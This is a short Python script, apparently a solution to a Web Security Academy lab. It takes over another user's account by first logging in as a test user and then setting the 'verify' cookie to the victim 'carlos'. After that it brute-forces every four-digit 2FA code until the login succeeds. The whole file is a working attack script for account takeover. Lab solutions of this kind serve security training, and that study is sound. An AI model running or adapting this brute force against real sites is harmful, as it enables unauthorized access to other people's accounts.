import requests
import itertools

URL="https://acbd1f591fea9e84c0c9659f0009009a.web-security-academy.net"
proxies = {
	"http" : "http://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080",
}

# Login as wiener
print(f"Login as wiener")
s = requests.Session()
s.proxies = proxies
s.post(URL+"/login", data={"username": "wiener", "password": "peter"})
# NOTE: Drop in burp proxy the GET /login2 with verify = wiener

# Generate 2FA code for carlos
print(f"Generate code for carlos")
s.cookies.set('verify', 'carlos', path='/', domain='acbd1f591fea9e84c0c9659f0009009a.web-security-academy.net')
s.get(URL+"/login2")


# Brute-force 2FA code
s.cookies.set('verify', 'carlos', path='/', domain='acbd1f591fea9e84c0c9659f0009009a.web-security-academy.net')
for i in itertools.product(range(0, 10), repeat=4):
    code = ''.join(map(str, i))
    r = s.post(URL+"/login2", data={"mfa-code": code})
    print(f"trying {code} \t {r.status_code}")
    if "Incorrect security code" not in r.text:
        print(code)
        break
